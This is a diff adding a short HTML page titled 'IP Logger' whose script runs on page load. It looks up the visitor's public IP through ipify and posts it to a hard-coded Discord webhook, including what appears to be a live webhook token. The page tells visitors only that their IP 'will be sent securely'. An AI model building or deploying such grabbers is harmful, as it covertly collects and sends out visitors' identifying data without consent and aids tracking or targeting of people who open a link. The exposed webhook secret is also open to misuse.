@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Logger</title>
+</head>
+<body>
+  <h2>Welcome</h2>
+  <p>Your public IP will be sent securely.</p>
+
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const webhookUrl = 'https://discord.com/api/webhooks/1396963841258033152/zLLJLj4olhiio1HQrXahhRs5WgFtale8x17V79tDgm6OdynerUHCK_QhwbjxzEYR3y4o';
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `🌐 New visitor IP: ${data.ip}`
+          })
+        });
+      });
+  </script>
+</body>
+</html>
